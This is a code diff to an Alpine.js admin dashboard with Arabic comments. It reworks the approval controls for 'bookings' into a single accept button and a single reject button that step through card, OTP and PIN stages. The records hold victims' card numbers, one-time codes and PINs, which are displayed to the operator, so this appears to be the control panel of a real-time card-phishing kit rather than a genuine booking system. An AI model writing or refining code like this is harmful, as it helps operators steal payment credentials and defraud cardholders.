@@ -79,6 +79,27 @@
             await fetch('/api/admin/bookings/'+id+'/'+ep,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({decision})});
             await this.silentRefresh();
         },
+
+        /* زرار واحد للقبول وواحد للرفض — يحددان المرحلة النشطة تلقائياً */
+        activeStage(b) {
+            if (!b) return null;
+            if (b.payment_decision === 'waiting') return 'payment';
+            if (b.payment_decision === 'approved' && b.otp_decision === 'waiting' && b.otp_code) return 'otp';
+            if (b.otp_decision === 'approved' && b.pin_decision === 'waiting' && b.pin_code) return 'pin';
+            return null; /* لا توجد مرحلة نشطة */
+        },
+        async smartDecision(decision) {
+            const stage = this.activeStage(this.sel);
+            if (!stage) return;
+            await this.makeDecision(this.sel.id, stage, decision);
+        },
+        stageLabel(b) {
+            const s = this.activeStage(b);
+            if (s === 'payment') return 'البطاقة';
+            if (s === 'otp')     return 'OTP: ' + (b.otp_code||'');
+            if (s === 'pin')     return 'PIN: ' + (b.pin_code||'');
+            return null;
+        },
         async updateStatus(id, status) {
             await fetch('/api/admin/bookings/'+id,{method:'PATCH',headers:{'Content-Type':'application/json'},body:JSON.stringify({status})});
             await this.silentRefresh();
@@ -280,66 +301,50 @@
                             </div>
                         </template>
 
-                        <!-- نظام الموافقة — OTP و PIN يظهران داخل بطاقة المرحلة مباشرة -->
+                        <!-- نظام الموافقة — زراران فقط -->
                         <template x-if="sel.card_number">
                             <div>
                                 <p class="sec">الموافقة</p>
 
-                                <!-- مرحلة البطاقة -->
-                                <div class="rounded-lg border border-gray-100 p-2 mb-1.5">
-                                    <div class="flex items-center justify-between mb-1">
-                                        <span class="text-xs font-semibold text-gray-700">البطاقة</span>
+                                <!-- حالة المراحل -->
+                                <div class="rounded-lg bg-gray-50 border border-gray-100 px-3 py-2 mb-2 text-xs">
+                                    <div class="flex justify-between mb-0.5">
+                                        <span class="text-gray-500">البطاقة</span>
                                         <span :class="dc(sel.payment_decision)" x-text="dl(sel.payment_decision)"></span>
                                     </div>
-                                    <!-- أزرار نشطة فقط لما payment_decision=waiting -->
-                                    <div class="flex gap-1.5" x-show="sel.payment_decision==='waiting'">
-                                        <button class="btn-ok" @click="makeDecision(sel.id,'payment','approved')">✓ قبول</button>
-                                        <button class="btn-no" @click="makeDecision(sel.id,'payment','rejected')">✗ رفض</button>
-                                    </div>
-                                    <!-- أزرار رمادية معطلة لما لم يصل رد بعد (لا card_number) -->
-                                    <p x-show="sel.payment_decision!=='waiting'" class="text-[10px] text-gray-400 mt-0.5">تم اتخاذ القرار</p>
-                                </div>
-
-                                <!-- مرحلة OTP -->
-                                <div class="rounded-lg border border-gray-100 p-2 mb-1.5">
-                                    <div class="flex items-center justify-between mb-1">
-                                        <span class="text-xs font-semibold text-gray-700">OTP: <span class="font-mono font-bold text-[#8B1A3A]" x-text="sel.otp_code||'—'"></span></span>
+                                    <div class="flex justify-between mb-0.5">
+                                        <span class="text-gray-500">OTP <span class="font-mono font-bold text-[#8B1A3A]" x-text="sel.otp_code ? '('+sel.otp_code+')' : ''"></span></span>
                                         <span :class="dc(sel.otp_decision)" x-text="dl(sel.otp_decision)"></span>
                                     </div>
-                                    <!-- أزرار نشطة: payment مقبول + otp انتظار + وصل otp -->
-                                    <div class="flex gap-1.5"
-                                        x-show="sel.payment_decision==='approved' && sel.otp_decision==='waiting' && sel.otp_code">
-                                        <button class="btn-ok" @click="makeDecision(sel.id,'otp','approved')">✓ قبول</button>
-                                        <button class="btn-no" @click="makeDecision(sel.id,'otp','rejected')">✗ رفض</button>
-                                    </div>
-                                    <!-- أزرار رمادية معطلة -->
-                                    <div class="flex gap-1.5"
-                                        x-show="sel.payment_decision!=='approved' || (sel.otp_decision==='waiting' && !sel.otp_code)">
-                                        <button disabled class="flex-1 rounded py-1 text-xs font-bold bg-gray-100 text-gray-400 cursor-not-allowed">✓ قبول</button>
-                                        <button disabled class="flex-1 rounded py-1 text-xs font-bold bg-gray-100 text-gray-400 cursor-not-allowed">✗ رفض</button>
-                                    </div>
-                                    <p x-show="sel.otp_decision!=='waiting'" class="text-[10px] text-gray-400 mt-0.5">تم اتخاذ القرار</p>
-                                </div>
-
-                                <!-- مرحلة PIN -->
-                                <div class="rounded-lg border border-gray-100 p-2">
-                                    <div class="flex items-center justify-between mb-1">
-                                        <span class="text-xs font-semibold text-gray-700">PIN: <span class="font-mono font-bold text-[#8B1A3A]" x-text="sel.pin_code||'—'"></span></span>
+                                    <div class="flex justify-between">
+                                        <span class="text-gray-500">PIN <span class="font-mono font-bold text-[#8B1A3A]" x-text="sel.pin_code ? '('+sel.pin_code+')' : ''"></span></span>
                                         <span :class="dc(sel.pin_decision)" x-text="dl(sel.pin_decision)"></span>
                                     </div>
-                                    <!-- أزرار نشطة: otp مقبول + pin انتظار + وصل pin -->
-                                    <div class="flex gap-1.5"
-                                        x-show="sel.otp_decision==='approved' && sel.pin_decision==='waiting' && sel.pin_code">
-                                        <button class="btn-ok" @click="makeDecision(sel.id,'pin','approved')">✓ قبول</button>
-                                        <button class="btn-no" @click="makeDecision(sel.id,'pin','rejected')">✗ رفض</button>
-                                    </div>
-                                    <!-- أزرار رمادية معطلة -->
-                                    <div class="flex gap-1.5"
-                                        x-show="sel.otp_decision!=='approved' || (sel.pin_decision==='waiting' && !sel.pin_code)">
-                                        <button disabled class="flex-1 rounded py-1 text-xs font-bold bg-gray-100 text-gray-400 cursor-not-allowed">✓ قبول</button>
-                                        <button disabled class="flex-1 rounded py-1 text-xs font-bold bg-gray-100 text-gray-400 cursor-not-allowed">✗ رفض</button>
-                                    </div>
-                                    <p x-show="sel.pin_decision!=='waiting'" class="text-[10px] text-gray-400 mt-0.5">تم اتخاذ القرار</p>
+                                </div>
+
+                                <!-- المرحلة النشطة الحالية -->
+                                <div class="rounded-lg border-2 border-[#8B1A3A]/30 bg-[#8B1A3A]/5 px-3 py-2 mb-2 text-xs" x-show="activeStage(sel)">
+                                    <p class="font-bold text-[#8B1A3A] mb-1">• في انتظار قرارك — <span x-text="stageLabel(sel)"></span></p>
+                                </div>
+                                <div class="rounded-lg border border-gray-100 bg-gray-50 px-3 py-2 mb-2 text-xs text-center text-gray-400" x-show="!activeStage(sel)">
+                                    تمت جميع المراحل
+                                </div>
+
+                                <!-- زراران فقط -->
+                                <div class="flex gap-2" x-show="activeStage(sel)">
+                                    <button class="btn-ok text-sm py-2"
+                                        @click="smartDecision('approved')">
+                                        ✓ قبول
+                                    </button>
+                                    <button class="btn-no text-sm py-2"
+                                        @click="smartDecision('rejected')">
+                                        ✗ رفض
+                                    </button>
+                                </div>
+                                <!-- أزرار رمادية لما لا توجد مرحلة نشطة -->
+                                <div class="flex gap-2" x-show="!activeStage(sel)">
+                                    <button disabled class="flex-1 rounded-lg py-2 text-sm font-bold bg-gray-100 text-gray-300 cursor-not-allowed">✓ قبول</button>
+                                    <button disabled class="flex-1 rounded-lg py-2 text-sm font-bold bg-gray-100 text-gray-300 cursor-not-allowed">✗ رفض</button>
                                 </div>
                             </div>
                         </template>
